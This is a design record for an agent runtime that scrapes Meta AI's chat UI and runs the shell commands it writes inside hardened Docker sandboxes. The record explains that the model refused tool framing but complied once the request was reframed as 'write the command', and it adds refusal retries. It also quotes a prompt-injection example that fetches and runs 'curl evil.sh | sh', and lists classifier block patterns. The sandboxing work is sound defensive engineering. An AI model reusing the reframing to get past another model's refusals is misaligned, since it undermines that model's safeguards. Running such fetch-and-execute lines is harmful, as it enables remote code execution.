# Design: Agent Tools Execution

> **Retrospective record.** This design documents the architecture that is already
> implemented and verified on branch `feat/agent-tools` (10 tasks, 38 passing tests). It is
> registered in SDD after the fact. Where this document describes a decision, the code is the
> source of truth; this file explains *why* that shape won and what was rejected. It stays
> honest about what shipped and what remains a known limit.

## Context and Goals

`meta-api` exposed Meta AI as an OpenAI-compatible chat broker, but the model could only
produce text: it could describe the world, not act on it. The goal of this change is to turn
the broker into an **agent runtime** that executes shell commands on the operator's behalf.

The end-to-end mission is:

> a **natural-language task** ("count the lines in this project") is framed with a command
> protocol, Meta AI answers with a **shell command**, an **isolated Docker sandbox executes
> it**, the captured output is fed back to Meta, and the loop repeats until the model answers
> in plain text or a budget runs out.

The result is returned as an `agent:{ok,reason,steps,transcript}` block through the existing
`/v1/jobs/{job_id}` poll endpoint, preserving the broker's async job model.

The core protocol insight was already proven before this change: Meta refuses tool framing
("that is not a real tool of my system") but complies when asked to *write the command*.
This change is not about discovering the protocol — it is about making the proven loop
**trustworthy enough to actually use**: a security posture that matches its own comments,
recovery that preserves the agent path, budgets that allow multi-step missions, input
validation that cannot mount arbitrary host paths, regression tests, and documentation.

Goals, in priority order:

1. **Safety first** — model-authored text must never reach a host shell. Isolation is the
   feature, not a wrapper around it.
2. **Honest outcomes** — every terminal state (success, `max-steps`, `budget`, `meta-error`,
   `meta-refusal`) resolves rather than throws, and the transcript survives partial failures.
3. **Multi-step patience** — real Meta turns take 20–90s; the loop must survive enough steps
   to finish a mission, bounded by a hard wall clock.
4. **No new dependencies** — Node 22 native `node:test`; no npm packages added.

References: `proposal.md` (scope, capabilities, risks), the five delta specs under
`specs/` (behavioral contract), and `odd/tasks/agent-tools.md` (implementation record, T1–T10).

## Technical Approach

The strategy is a **single-agent command loop over a strictly framed text protocol**, with
execution contained by **one ephemeral Docker container per command** and a **deny-by-default
classifier** in front of the container. Nothing about Meta is trusted: the parser treats every
answer as attacker-influenced text, the classifier treats every command as a potential write,
and the sandbox treats every command as untrusted even after it passes classification.

The implementation is deliberately modular so each trust boundary is independently testable:

| Component | File | Trust role |
|---|---|---|
| Loop orchestration | `agent/loop.js` | Owns step/budget lifecycle, transcript, and in-band failure resolution |
| Tool protocol + parser | `agent/tools.js` | Converts untrusted model text into a command or an error; owns the protocol prompt |
| Sandbox execution | `agent/sandbox.js` | Classifies for read/write, executes in Docker, owns the self-check capability probe |
| Broker wiring | `server.mjs` | Route validation, queue/dispatch, agent branch, persistence, poll passthrough |

The loop is written against an injectable `ask()` and an injectable `exec()` so the entire
state machine is unit-testable without Meta and without Docker.

## Architecture

### Components and interaction

    ┌──────────────────────────────────────────────────────────────────────────┐
    │ server.mjs                                                                │
    │                                                                          │
    │  POST /v1/agent ── validate ── selfCheck gate ── submitAgent()           │
    │       │  task, maxSteps, budgetMs, sandboxTimeoutMs,                     │
    │       │  allowWrite+ack, allowNetwork, workdir, images[]                 │
    │       │                                                                  │
    │       └──► jobs Map ── persistPending() ──► pending-jobs.json            │
    │                 │                                                        │
    │                 └── dispatchJob ──► worker queue ──► pump(worker)        │
    │                                                          │              │
    │                        (j.agent) ───────────────────────┘              │
    │                                                          ▼              │
    │                       runAgentLoop({ ask, task, maxSteps, budgetMs,      │
    │                                      sandbox, onEvent })                 │
    │                                                          │              │
    │   ask(prompt,{step}) = askMeta(worker,...)  ◄────────────┤              │
    │     (first step: images[] attached)                      │              │
    │                                                          ▼              │
    │                        parseToolCall(answer)  ── tool protocol          │
    │                                                          │              │
    │                        runSandboxed(command, opts) ──────┤              │
    │                                                          │              │
    │                        j.content / j.agentResult ◄───────┘              │
    │                                                          │              │
    │  GET /v1/jobs/{id} ── status, content, agent{ok,reason,steps,transcript}│
    └──────────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
    ┌──────────────────────────────────────────────────────────────────────────┐
    │ Docker: ephemeral container per command                                  │
    │   --rm --network none --read-only --cap-drop=ALL                         │
    │   --security-opt=no-new-privileges --memory 256m --cpus 1 --pids 100     │
    │   -v <workdir>:/workspace(:ro unless allowWrite)                         │
    │   image meta-sandbox:1 (php-cli, curl, git, rg, ... baked in)            │
    │   inner: timeout <secs> /bin/sh -c <command>                             │
    │   host backstop: docker kill <name>                                      │
    └──────────────────────────────────────────────────────────────────────────┘

### The mission loop (sequence)

    Operator       server.mjs         loop.js          tools.js        sandbox.js    Docker
       │               │                │                 │               │            │
       │ POST /v1/agent│                │                 │               │            │
       │──────────────►│ selfCheck()─────────────────────────────────────►│ probe ────►│
       │               │◄──────────────────── writeBlocked/networkBlocked ... ─────────│
       │ 202 job_id    │                │                 │               │            │
       │◄──────────────│ submitAgent ──► dispatch ──► pump              │            │
       │               │                │                 │               │            │
       │               │ ask(task+protocol)              │               │            │
       │               │───────────────►│                 │               │            │
       │               │                │◄── answer ──────(Meta)          │            │
       │               │                │ parseToolCall ─►│               │            │
       │               │                │◄── command/error│               │            │
       │               │                │ runSandboxed ──────────────────►│ docker run►│
       │               │                │◄── output/denied/timedOut ──────│◄───────────│
       │               │                │ feed result back as next prompt │            │
       │               │                │  ... repeat ≤ maxSteps, ≤ budgetMs ...        │
       │               │◄── {ok,reason,steps,transcript,answer} ──────────│            │
       │               │ j.content + j.agentResult        │               │            │
       │ GET /v1/jobs/id                │                 │               │            │
       │──────────────►│ agent block    │                 │               │            │
       │◄──────────────│                │                 │               │            │

## Architecture Decisions

### Decision: The protocol IS the schema — frame the task as "write the command"

**Choice**: Meta is a chat model with no function calling and no tool schema. Instead of
presenting a tool/function definition, the loop appends `TOOL_PROTOCOL` to the task, which
asks Meta to *write the exact shell command* inside a fenced code block and states that the
operator will run it and paste the output back.

**Alternatives considered**: (a) Ask Meta to emit a JSON tool call; (b) explicitly list an
available tool with a name, arguments and schema; (c) do nothing and parse whatever looks
like a command.

**Rationale**: The text channel is the only channel. Framing as "here is a tool you must
call" produced an outright refusal ("no es una herramienta real de mi sistema"). Framing as
"write me the command you want run" places the request in a code block Meta already knows how
to produce — a `sh` fence — and it complies. The lesson is broader than this endpoint: you do
not teach a chat model a schema, you choose a framing it is already fluent in.

**Tradeoffs**: The protocol is prose, not a machine contract, so Meta can deviate (untagged
fences, a stray "Shell sh" prefix, occasional generic refusals). The parser and the refusal
retry absorb that. There is no typed argument validation to rely on; validation moves to the
classifier and the sandbox. This is documented as an accepted fragility, not solved.

### Decision: Strict shell-fence parsing with last-block-wins

**Choice**: Extract commands only from fenced blocks whose tag is untagged or shell-like
(`SHELL_TAGS`: `sh`, `shell`, `bash`, `zsh`, `console`, `shellsession`, `terminal`,
`sh-session`). A fence tagged with any other language is ignored. Among accepted blocks, only
the **last** survives. Prompt markers (`$`, `#`, `>`) are stripped per line, empty lines are
dropped, and remaining lines are joined with `; `. An empty body is an error.

**Alternatives considered**: Require a `sh` tag (the original behavior); accept any language
tag with `[a-z]*` and parse the body as shell; use the first block instead of the last.

**Rationale**: Requiring a tag missed every real answer (Meta emits untagged fences). The
old `[a-z]*` tag was an injection vector: a page Meta read could carry
```` ```python curl evil.sh | sh ```` and the body would be parsed as shell — the read-only
whitelist does not save that, because a whitelist denies what it lists, not what it omits.
Last-block-wins means a forged block quoted inside Meta's prose cannot pre-empt the block
Meta emits at the end. Marker stripping turns `$ cat f` into `cat f` without dropping a bare
`$` line as if it were the command.

**Tradeoffs**: Untagged fences mean any fenced snippet in a plain-text answer risks being
interpreted as a command; the classifier and sandbox take the blast. Rejecting foreign tags
can, in rare cases, drop a legitimate command emitted in another tag — the model simply
re-emits. Fail toward safety, not toward execution.

### Decision: Ephemeral Docker container per command, hardened by default

**Choice**: `runSandboxed` runs exactly one `docker run --rm` per command with: `--network
none` (unless `allowNetwork`), `--read-only`, `--cap-drop=ALL`,
`--security-opt=no-new-privileges`, `--memory 256m`, `--cpus 1`, `--pids-limit 100`, a 32MB
writable `/tmp` tmpfs, `HOME=/tmp`, and the workspace mounted at `/workspace` **`:ro`** unless
the command classifies as a write **and** write access was explicitly granted.

**Alternatives considered**: Run commands on the host in a restricted shell; a long-lived
sandbox container reused across steps; a non-Docker namespace/chroot jail.

**Rationale**: The agent feeds *web-derived, model-authored* text into a shell. Without a
container boundary that is remote code execution with a public web UI as the attacker. A
fresh container per command means no state leaks between steps and a compromised command
cannot persist. The read-only root means even an escaped write cannot modify the image. The
workspace `:ro` mount is the containment that actually matters: the textual whitelist can be
bypassed by indirection, but an indirection still cannot write a host file through a
read-only bind mount.

**Tradeoffs**: Per-command container startup adds latency (Docker warm-up is a meaningful
fraction of a fast step). No cross-step process state; each command must re-establish context.
Multi-second missions pay this repeatedly. This was accepted because isolation is the product.

### Decision: Deny-by-default classifier with a read-only whitelist

**Choice**: `classify(command)` returns a write unless **every** segment (split on `|`, `;`,
`&`) matches the read-only whitelist. A blocklist of mutation and indirection shapes (regex)
runs first and poisons the whole command. Indirection — `$(...)`, backticks, `find -exec`/
`-delete`, `xargs`, `awk`/`sed system(...)` — is classified as a write.

**Alternatives considered**: A prefix-only check on the leading token (the original bug: 
`echo ok > f` matched the read-only `echo` rule); a semantic shell parser (parse the AST and
prove read-onlyness); allow-by-default with a write blocklist.

**Rationale**: The original classifier decided from the leading token and let a redirection
sneak past a read-only verb. Deny-by-default inverts the failure mode: a rare false positive
denies a read (the model can rephrase) while a missed mutation would be code execution. The
blocklist addresses indirection because those constructs execute text the whitelist never
sees.

**Tradeoffs — and the honest limit**: the classifier is **textual pattern matching, not a
shell parser**. It reduces the attack surface but does not eliminate the residual indirection
vector (exotic encodings, alternative tools, constructs not enumerated). The real containment
is the `:ro` mount plus `--network none`; the classifier is defense in depth. This is stated
plainly so nobody mistakes the list for the guarantee.

### Decision: Self-check gates the route; write probe proves denial-by-policy

**Choice**: `selfCheck()` runs four sub-probes before the route accepts work: (a) a write
attempt under the **default** policy must be refused by the policy layer (`writeBlocked:true`,
no container created), (b) a read-classified command must execute and read the mounted
workspace (`fsRead`), (c) trusted static code must prove egress is blocked (`networkBlocked`),
and (d) the container host identity must differ from the host (`hostHomeInvisible`). The route
returns `503` and starts no job unless all hold (skippable only with `verify:false`).

**Alternatives considered**: Probe with `allowWrite:true` and then clean up (the shipped bug:
the probe wrote `.sandbox-probe` into the host workspace on **every** verified request and the
route never inspected a `writeBlocked` field); trust configuration instead of probing.

**Rationale**: "The sandbox is configured" and "the sandbox is enforcing" are different
claims. The earlier probe contradicted its own comment and leaked a host artifact. The fix
is to probe the *policy layer itself*: the write must be denied before any container exists,
so a passing probe is positive proof nothing executed. Gating the route makes a broken
Docker/daemon posture fail closed with a typed `503` instead of executing model text on the
host.

**Tradeoffs**: Every verified request pays the probe cost (several container round-trips).
A healthy sandbox is now a hard startup dependency for the route — the intended failure mode,
but it means a Docker hiccup looks like a `503` rather than a chat error.

### Decision: Double timeout brake and output cap

**Choice**: Two independent limits. Inside the container, `timeout <secs> /bin/sh -c
<command>` kills the command's process group. On the host, a timer runs `docker kill <name>`
after `timeoutMs`, with `execFile`'s own timeout as a third net. Output is capped at 8192
bytes and marked `[salida truncada]`. Timeouts are detected from exit status/signal (GNU
`timeout` → 124; SIGKILL → 137), not from stderr wording.

**Alternatives considered**: Rely on `execFile`'s timeout only; parse the word "timeout" in
stderr.

**Rationale**: Killing the host-side `docker` CLI does **not** stop the container: live
testing showed `sleep 30` under a 5s budget kept running for the full 30s. The inner `timeout`
makes the container terminate its own process group; the host backstop covers a wedged inner
shell. The command is passed via `sh -c` with a JSON-stringified argument so pipes are
interpreted by the container shell, not by `timeout`. Stderr matching missed both real exit
codes; status/signal detection catches them.

**Tradeoffs**: Two mechanisms can race (inner usually wins), and the host backstop can kill a
container mid-write. Denying a read is safe; killing a command that was about to finish is an
accepted cost of a hard bound.

### Decision: Completion is the end-of-message action bar plus a multi-message grace window

**Choice**: A turn is complete only when Meta renders the **end-of-message action bar**
(`button[aria-label="Copiar respuesta"]`, `Compartir`, `Me gusta esta respuesta`). Simply
seeing the bar does not close the turn: it starts a grace window (`COPY_GRACE_MS`, default
12000ms). If Meta starts generating again (a follow-up message), the close is cancelled and
reading continues; only a stable, non-generating finalized message ends the turn. A hard
absolute timeout and `MAX_POLLS` bound the wait regardless.

**Alternatives considered**: The legacy `.msg-copy` selector; text stability (unchanged text
for N polls) as completion; the stop/generating control vanishing as completion; returning
the first non-empty read.

**Rationale — why the previous heuristics failed**:

- `.msg-copy` matched nothing on the current UI; a full day of live data showed zero hits
  while every finalized message carried the aria-labeled action bar. The selector was dead.
- Text stability means "paused", not "done" — Meta pauses while interpreting a prompt.
- The stop-control vanishing is **not** completion: during web search the control disappears
  while Meta is still working, and a status line ("Buscando imágenes de panadería") was once
  returned as the final answer.
- Meta answers in **several messages**: a quick status message finalizes first ("Revisando
  navegación móvil") and she keeps working in a follow-up ("Reconstruyendo landing.html").
  Hence the grace window rather than first-bar-wins.
- Sampling the stop control only every 8th poll missed it entirely for fast answers.

**Tradeoffs**: The grace window adds up to ~12s to turns that genuinely produced a follow-up
message, and the completion signal depends on scraping Meta's UI — inherently fragile and
explicitly **not contractual** (see Risks). The real semaphore is a DOM detail that can change
without notice; the budget, hard timeout and honest failure summary are what keep a broken UI
from corrupting results.

### Decision: Budget and patience — two budgets, not one

**Choice**: `budgetMs` is a **per-job wall clock**, clamped to 30000..3600000 ms, defaulting
to `META_AGENT_BUDGET_MS` (900000). It is checked **between steps** by the loop. Separately,
`sandboxTimeoutMs` is a **per-command** container timeout, clamped to 5000..600000 ms,
defaulting to 30000. `maxSteps` (1..32, default 8) bounds the loop iteration count. Refusal
retries are bounded separately (`META_AGENT_REFUSAL_RETRIES`, default 3, clamped 0..6).

**Alternatives considered**: A single hardcoded 180s budget (the shipped bug: with 20–90s Meta
turns, multi-step missions died after 2–4 steps on "budget"); an unlimited budget bounded only
by `maxSteps`.

**Rationale**: Two different things must be bounded for two different reasons. The wall clock
bounds the whole mission by real time, which is what an operator actually cares about. The
per-command timeout bounds one command (an install legitimately needs minutes) without
consuming the whole mission budget. A single 180s budget conflated them and killed honest
multi-step work.

**Tradeoffs**: Budget is checked *between* steps, so a step that starts just under budget can
overrun it by up to one Meta turn plus one command timeout. The loop returns `ok:false` with
reason `budget` and the partial transcript rather than a final answer — honest, but the
caller must handle a bounded-but-not-exact stop.

### Decision: Command length cap raised to 50000 chars

**Choice**: `MAX_COMMAND = max(4000, META_TOOL_MAX_COMMAND || 50000)`. The parser rejects a
command longer than the cap with a distinct error; a command exactly at the cap is accepted.

**Alternatives considered**: Keep the original fixed 4000-char cap; require the model to chunk
large payloads.

**Rationale**: The old cap was tuned for read-only inspection. A file-writing agent
legitimately needs to carry a whole source file encoded as base64 in a single `python3 -c`;
a ~3KB file becomes ~4KB+ of base64 plus quoting, exceeding 4000. Chunking below the cap is
possible but error-prone — a truncated base64 blob corrupts the target file — so the cap sits
high enough for real files while still bounding a single job. The floor of 4000 prevents an
env value from silently disabling the guard.

**Tradeoffs**: A 50KB command is a lot of model-authored text reaching the sandbox in one
shot; the sandbox boundary, not the cap, is what makes that acceptable. The cap is a blast
bound, not a security control.

### Decision: Agent identity persists across restart; recovered jobs replay as agent jobs

**Choice**: `persistPending()` mirrors queued/running agent jobs to `pending-jobs.json` with
the full identity: `agent:true`, `maxSteps`, `budgetMs`, `sandboxTimeoutMs`, `allowWrite`,
`allowNetwork`, `workdir` (and `images`). `loadPending()` reconstructs that identity on boot
and re-queues, dropping jobs older than the recovery window (`META_RECOVERY_MAX_AGE_MS`,
default 30 min). `pump` branches on `j.agent` and drives `runAgentLoop`, never a raw chat
completion. Agent jobs skip pre-pump context rotation.

**Alternatives considered**: Persist only the task string and re-submit as chat (the shipped
bug: a restarted agent job replayed as a plain chat completion — raw task to Meta, no
protocol, no sandbox); drop in-flight agent jobs on restart.

**Rationale**: Agent jobs are ordinary jobs that carry a flag, so they ride the same pool,
queue, recovery path and idle timer. Losing the identity on restart silently downgrades a
sandboxed mission to an unsandboxed chat turn — the worst possible failure, because the
caller believes the mission is still isolated. Rotation is skipped because the loop drives
the worker's thread turn by turn: the mission transcript **is** the context, and rotating
first would spend a Meta turn on a summary the loop never reads while deleting the thread
mid-mission.

**Tradeoffs**: The persisted file grows with job size (`images` can be large); it is capped at
`META_MAX_PERSISTED` (50). A recovered job re-runs its first turn including screenshots, so
recovery re-sends attachments. Agent jobs that die mid-budget resume from the beginning of the
task rather than from the last step (the loop is not checkpointed); the transcript lives only
in the completed job.

### Decision: In-band failure resolution and honest summaries

**Choice**: `runAgentLoop` **resolves** for every in-band outcome, including an `ask()`
throw: it returns `{ok:false, reason:"meta-error:<msg>", steps, transcript, answer}` with the
partial transcript. `max-steps`, `budget` and persistent `meta-refusal` likewise resolve with
their reason and transcript. `pump` writes `j.content` from `res.answer` on success, or from
`agentFailureSummary(res)` on failure, and sets `j.agentResult`. The poll caps each turn's
`text`/`output` at 1200 chars.

**Alternatives considered**: Let `ask()` throws propagate to `pump`'s catch and mark the job
`error` (the shipped bug: the transcript was lost, so nobody could tell how far the agent
got); return `undefined` content on failure.

**Rationale**: A mission is evidence. A mid-loop rate limit or dead thread used to erase the
work done so far; the fix preserves it. Every non-final outcome gets a human-readable summary
so a plain poller reading `content` never sees an empty string hiding a half-finished mission,
while the full evidence stays in `agentResult`. Resolution-not-throw is what makes the failure
modes testable without simulating broker crash paths.

**Tradeoffs**: The caller must inspect `agent.ok` rather than rely on job status; a failed
mission still reports `status:"done"`. Transcript caps can truncate very large outputs in the
poll response (the sandbox itself already caps at 8192 bytes per command). This is intentional
bounded-payload behavior.

### Decision: Multimodal screenshots attach on the first turn only

**Choice**: `POST /v1/agent` accepts `images[]`, keeps only strings starting with
`data:image/`, caps at four, stores them with the job, and attaches them on the **first**
`ask()` call. Later steps send no images; the Meta thread retains them as context.

**Alternatives considered**: Re-attach images on every turn; reject images on the agent route
and keep it text-only.

**Rationale**: The agent's whole value is iterating — seeing its own output. A screenshot of
the current artifact lets Meta inspect the real state it is fixing, and attaching at step 1
means Meta can interpret later command output while still seeing the screenshot, without
paying to re-upload it every turn. Recovery replays the first turn, so persisted images ride
along.

**Tradeoffs**: Images are only sent once; if the thread is lost mid-mission the model loses
them until recovery. Persisting screenshots bloats `pending-jobs.json`. The route trusts the
`data:image/` prefix as a filter, not a content check — it is a bounded, local operator input,
not an authentication boundary.

### Decision: Bake tooling into the sandbox image

**Choice**: `agent/Dockerfile.sandbox` builds `meta-sandbox:1` from `python:3.11-slim` with
`git`, `ripgrep`, `coreutils`, `findutils`, `jq`, `less`, `procps`, `diffutils`, `php-cli`,
`curl` preinstalled, running as an unprivileged `agent` user.

**Alternatives considered**: `apt-get install` at runtime inside the container; a larger
prebuilt base image.

**Rationale**: The runtime container has no network by default and a read-only root, so
`apt-get install` can **never** work at runtime — it cannot write `/var/lib/apt/lists` or
`/var/cache/apt`. Anything a mission might need must be baked in at build time, which is also
a security property: the tool set is fixed and reviewable. `php-cli` and `curl` exist because
web-dev tasks surfaced the need.

**Tradeoffs**: Adding a tool requires rebuilding and redeploying the image, not just a command.
The image is the agent's capability ceiling; a missing tool becomes a failed step the model
must work around.

## Alternatives Rejected (summary)

| Alternative | Why rejected |
|---|---|
| **JSON tool protocol as the primary shape** | Meta refused tool framing outright. The JSON form is kept as a legacy/compat parser branch only; the primary protocol is a natural "write the command" `sh` fence. |
| **Any-language fence parsing** (`[a-z]*`) | Let a `python` fence body be parsed as shell — a real injection vector from page-derived text. Replaced with a `SHELL_TAGS` allowlist. |
| **Leading-token classification** | `echo ok > f` matched the read-only `echo` rule. Replaced with deny-by-default plus per-segment whitelist. |
| **Semantic shell whitelist (parse the AST and prove read-onlyness)** | A real shell parser would be more correct but is a large, bug-prone subsystem for a local single-operator tool; the `:ro` mount + no network contain the residual vector. Documented as a known limit, not solved. |
| **Unlimited / very large budgets, unbounded retries** | Would let a broken UI or rate limit keep the browser and job alive indefinitely; `activeJobs()` would never reach 0 and idle close would never fire. Bounded by `budgetMs`, `maxSteps`, `MAX_POLLS`, `HARD_TIMEOUT_MS`, and bounded refusal retries. |
| **Reuse a long-lived sandbox container** | Preserves state between commands, so one compromised command persists; a fresh ephemeral container per command is the safer default. |
| **`execFile` timeout as the only brake** | Does not stop the container; `sleep 30` under a 5s budget ran the full 30s. Needed the inner `timeout` + host `docker kill`. |
| **First-accepted-block-wins** | A forged block quoted in Meta's prose could pre-empt the real one. Last-block-wins is safer. |
| **Text-stability / stop-control heuristics for completion** | Both returned progress text as final answers; the action bar is the only trusted semaphore. |
| **API authentication for the agent route** | Out of scope by design; localhost binding remains the only access control (single-operator local deployment). |

## Interfaces / Contracts

### `POST /v1/agent` (request)

```jsonc
{
  "task": "string, required, <= 8000 chars",          // or messages[0].content
  "maxSteps": 8,                                        // clamped 1..32
  "budgetMs": 900000,                                   // clamped 30000..3600000; default META_AGENT_BUDGET_MS
  "sandboxTimeoutMs": 30000,                            // clamped 5000..600000
  "allowWrite": false,                                  // requires allowWriteAck:true -> else 400
  "allowWriteAck": false,
  "allowNetwork": false,
  "workdir": "/home/test/test",                         // must realpath inside META_SANDBOX_WORKDIR_ROOTS -> else 400
  "images": ["data:image/png;base64,..."],              // only data:image/* strings, max 4
  "verify": true                                        // false skips the selfCheck gate
}
```

Responses: `400` invalid task/missing task/oversized task/write without ack/bad workdir;
`503` self-check did not prove the default posture; `202 {job_id, status:"queued",
poll:"/v1/jobs/{job_id}"}`.

### Loop result (`runAgentLoop` resolves, never throws in band)

```jsonc
{
  "ok": true,
  "reason": null,                 // "budget" | "max-steps" | "meta-error:<msg>" | "meta-refusal" on failure
  "steps": 3,                     // completed steps
  "transcript": [
    { "role": "user",      "step": 1, "text": "<framed prompt>" },
    { "role": "assistant", "step": 1, "text": "<raw Meta answer>" },
    { "role": "tool",      "step": 1, "command": "ls", "output": "..." }
  ],
  "answer": "final plain-text answer"   // null/partial on failure
}
```

### Parser result (`parseToolCall`)

```jsonc
{ "tool": "run", "command": "ls -la", "shape": "shell" }   // or shape:"json"
{ "error": "bloque de shell vacio" }                        // or oversized / invalid JSON / unknown tool / missing command
null                                                        // no accepted fence -> treated as a possible final answer
```

### Sandbox result (`runSandboxed`)

```jsonc
{ "ok": bool, "denied": bool, "exitCode": 0, "output": "...", "truncated": bool,
  "ms": 914, "timedOut": bool }
```

### Self-check result (`selfCheck`)

```jsonc
{ "ok": true, "writeBlocked": true, "fsRead": true, "networkBlocked": true,
  "hostHomeInvisible": true, "raw": "..." }
```

### Poll response (`GET /v1/jobs/{job_id}`)

```jsonc
{ "job_id": "...", "status": "done", "content": "final answer or failure summary",
  "error": null, "worker": 0,
  "agent": { "ok": true, "reason": null, "steps": 3,
             "transcript": [ { "role": "...", "step": 1, "text": "<=1200 chars",
                               "command": "...", "output": "<=1200 chars" } ] } }
```

## File Changes

| File | Action | Description |
|------|--------|-------------|
| `server.mjs` | Modify | `POST /v1/agent` route + validation, `submitAgent`, agent branch in `pump`, self-check `503` gate, workdir realpath confinement, input clamping, first-turn image attach, agent identity in `persistPending`/`loadPending`, `agentFailureSummary`, poll passthrough of `agentResult`, action-bar completion semaphore + grace window |
| `agent/loop.js` | Modify | `runAgentLoop`: budget between steps, `maxSteps`, refusal retry, transcript preservation on `ask()` failure, injection of `ask`/`exec` |
| `agent/tools.js` | Modify | `TOOL_PROTOCOL` framing, `SHELL_TAGS` parser, last-block-wins, marker stripping, `MAX_COMMAND` 50000 cap, legacy JSON shape |
| `agent/sandbox.js` | Modify | `classify()` deny-by-default + indirection, `runSandboxed` Docker posture, double timeout brake, output cap, `selfCheck()` policy probe |
| `agent/Dockerfile.sandbox` | Modify | Bake `php-cli`, `curl` (and base tooling) into `meta-sandbox:1` |
| `agent/tools.test.js` | Create | Parser regression suite (15 tests) |
| `agent/sandbox.test.js` | Create | Classifier + self-check regression suite (12 tests) |
| `agent/loop.test.js` | Create | Loop behavior suite with stubbed `ask`/`exec` (11 tests) |
| `README.md` | Modify | Endpoint list and full `/v1/agent` contract + agent env vars |
| `.gitignore` | Modify | Fix corrupted `*.logagent/` line |
| `odd/tasks/agent-tools.md` | Create | ODD feature/task record (T1–T10) |
| `systemd/meta-api.service.d/paciencia-agente.conf` | Create | Runtime budget/patience configuration |
| `systemd/meta-api.service.d/medicion.conf` | Delete | Measurement-transient state untracked |

## Testing Strategy

Native `node:test`, zero new dependencies. Run with Node 22 from the repo root — **not**
`node --test agent/` (that runner rejects directories):

```
cd /home/test/test/meta-api && node --test 'agent/*.test.js'
```

| Layer | What to Test | Approach |
|-------|-------------|----------|
| Unit — parser | Tagged/untagged fences, foreign tag ignored, foreign fence cannot pre-empt, `Shell sh` prefix, empty block error, oversized vs exact-cap, last-block-wins, marker stripping, JSON shape (valid/unknown tool/missing command/invalid JSON), `formatResult` | `agent/tools.test.js`, pure functions |
| Unit — classifier | Reads pass, mutations deny, every pipe segment read-only, indirection (`$(...)`, backticks, `find -exec`/`-delete`, `xargs`, `awk`/`sed system()`) denies, self-check probe classification | `agent/sandbox.test.js` |
| Unit — loop | Multi-step success, parser-rejection correction, `maxSteps`, budget, `meta-error` preserves transcript, refusal retry, persistent refusal, default budget env | `agent/loop.test.js` with stubbed `ask` and injected `exec` |
| Integration (docker-only) | `selfCheck()` proves the full default posture against a live Docker daemon | `agent/sandbox.test.js` (`selfCheck enforces the whole default posture`, skipped/conditional on Docker) |
| E2E (live, gated) | Single + multi-step mission via `POST /v1/agent` watching journal `agent` events | T10, verified live on `job-39368622` (7 steps, ~150s of 900s); not part of the automated suite |

Baseline: **38 passed / 0 failed / 0 skipped** (15 parser + 12 sandbox + 11 loop). RED tests were
written with the behavior they pin; no new dependency was added.

## Threat Matrix

This change has shell, subprocess and process-integration boundaries, so the applicability
matrix is included. Rows about VCS/PR automation are marked N/A — this change contains no
commit/push/PR automation; the agent merely *runs commands*, and mutating git subcommands are
blanket-denied by the classifier.

| Boundary | Minimum adversarial cases | Applicability | Design response | Planned RED tests |
|---|---|---|---|---|
| Documentation-like paths | `requirements.txt`, `CMakeLists.txt`, executable Markdown/MDX, `README.sh` | **Applicable** — the agent can be asked to execute a file by path regardless of extension | The classifier never trusts a file path: only the read-only whitelist passes, and no whitelist entry executes a file (`sh file`, `./x`, `python3 x.py` all classify as write). The `:ro` mount + no network contain anything that slips through. | Classifier cases pin `cat f \| sh` and non-whitelisted leads as write; add explicit `sh README.sh` / `./script` cases if the suite is extended. |
| Git repository selection | `git -C`, relative paths, absolute paths | **Applicable** — git is baked into the image and read-only git subcommands are whitelisted | Whitelist matches `git <read-subcommand>` only; `git -C <path> status` fails the whitelist and classifies as write. Confinement is the `/workspace` bind mount: paths outside it are the container's own read-only root, not the host. | Existing `git status` read / mutating-git write cases; `git -C` denied asserted implicitly by the whitelist (extend if needed). |
| Commit state | staged, `commit -a`, empty index | **Applicable** — git is available and the blocklist covers commits | All mutating subcommands (`add`, `commit`, `checkout`, `reset`, `push`, `merge`, `rebase`, `clean`, `init`, `apply`, `stash`, `tag`) are writes; any commit form is denied without `allowWrite`, and denied at the mount even with it unless explicitly opted in. | `git commit -m x` classifies as write (pinned in `sandbox.test.js`). |
| Push state | tracking branch, first push, explicit refspec | **Applicable** — same blocklist | `git push` in any refspec form is a write; default `--network none` means a push cannot reach a remote even under `allowWrite`. | `git push` covered by the mutating-git blocklist (extend with refspec forms if needed). |
| PR commands | explicit `--head`, environment prefix, composed commands | **N/A** — no PR automation, no VCS credentials, no `gh` in the image, no network by default | Nothing to design; contained by no-network + no credentials. | No task. |
| Indirection (this change's critical residual vector) | `$(...)`, backticks, `find -exec`/`-delete`, `xargs`, `awk`/`sed system()` | **Applicable** | Explicitly blocked by `WRITE_MARKERS`; residual exotic forms contained by the `:ro` mount and `--network none`. | Pinned by `sandbox.test.js` indirection cases. |

Applicable rows are design requirements and propagate to tasks/tests unchanged; N/A rows
require no task.

## Risks

| Risk | Likelihood | Impact | Mitigation |
|------|-----------|--------|------------|
| Meta web UI scraping breaks completion detection at any time (action-bar selectors, multi-message grace, send confirmation) | High | Turn reported complete early / truncated, or never completes | Treat Meta as untrusted and non-contractual; `MAX_POLLS` + `HARD_TIMEOUT_MS` bound the wait; budget is a hard stop; partial transcripts preserved instead of corrupted results |
| Textual classifier bypassed via indirection (`$(...)`, backticks, `find -exec`, `awk system()`, exotic encodings) | Med | A "read" command executes side effects | Deny-by-default + indirection blocklist; real containment is the `:ro` mount + `--network none`; documented as a known residual vector, not claimed solved |
| `workdir` mount exposes arbitrary host paths | Low | Host filesystem read/write exposure | `realpath` confinement against `META_SANDBOX_WORKDIR_ROOTS`; symlink escape resolves outside the root; request refused `400` |
| Docker daemon/image unavailable | Low | Route unavailable | Self-check returns `503` by design (fail closed); README documents the image build |
| Latency and cost of per-command container startup + 12s grace window on every turn | Med | Slow multi-step missions | Bounded by `budgetMs`/`maxSteps`; make turns are the dominant cost anyway (20–90s); grace only delays turns with a follow-up |
| Long multi-step missions exhaust the wall clock | Med | `ok:false` with partial transcript | `budgetMs` clamped 30s..1h with 900s default; honest `budget` reason + transcript |
| Persisted agent jobs (`pending-jobs.json`) grow with images/transcripts | Low | Disk growth on a local deployment | `META_MAX_PERSISTED` cap (50); runtime state is gitignored |
| Live verification depends on the measurement round | Med | Cannot re-run live proof now | Unit + docker-only smoke verified; live single/multi-step verified on `job-39368622`; do not restart or POST to the live broker during measurement |

## Migration / Rollout

No data migration required. `pending-jobs.json` / `state.json` are gitignored runtime state;
in-flight agent jobs are lost on rollback, which is acceptable for a single-operator local
deployment.

Rollout requirements:

1. **Build the sandbox image**: `docker build -f agent/Dockerfile.sandbox -t meta-sandbox:1 .`
   (runtime `apt` is impossible by design, so the image is a deploy prerequisite).
2. **Restart the broker** to pick up the new `server.mjs`/agent modules and the
